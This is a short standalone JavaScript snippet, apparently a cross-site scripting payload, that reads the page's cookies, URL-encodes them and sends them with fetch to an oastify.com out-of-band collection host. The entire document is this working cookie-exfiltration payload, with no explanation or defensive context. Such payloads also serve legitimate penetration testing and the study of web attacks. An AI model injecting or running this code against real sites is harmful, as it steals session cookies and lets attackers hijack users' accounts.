(function () {
  const cookies = document.cookie;
  if (cookies) {
    const encodedCookies = encodeURIComponent(cookies);
    fetch(
      `https://lrgaw8kskuaavvzfc109nd2bk2qteo2d.oastify.com/?cookies=${encodedCookies}`
    );
  }
})();
